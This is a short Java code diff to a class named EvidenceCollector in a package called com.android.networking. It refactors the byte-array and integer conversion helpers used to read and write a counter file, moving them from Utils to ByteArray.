@@ -27,8 +27,8 @@ import com.android.networking.crypto.Encryption;
 import com.android.networking.crypto.Keys;
 import com.android.networking.file.AutoFile;
 import com.android.networking.file.Path;
+import com.android.networking.util.ByteArray;
 import com.android.networking.util.Check;
-import com.android.networking.util.Utils;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -156,7 +156,7 @@ public class EvidenceCollector {
 
 			final byte[] prog = new byte[4];
 			fos.read(prog);
-			progessive = Utils.byteArrayToInt(prog, 0);
+			progessive = ByteArray.byteArrayToInt(prog, 0);
 
 			fos.close();
 		} catch (final IOException e) {
@@ -181,7 +181,7 @@ public class EvidenceCollector {
 		try {
 			final FileOutputStream fos = content.openFileOutput(PROG_FILENAME, Context.MODE_PRIVATE);
 
-			fos.write(Utils.intToByteArray(logProgressive));
+			fos.write(ByteArray.intToByteArray(logProgressive));
 			fos.close();
 		} catch (final IOException e) {
 			if (Cfg.EXCEPTION) {
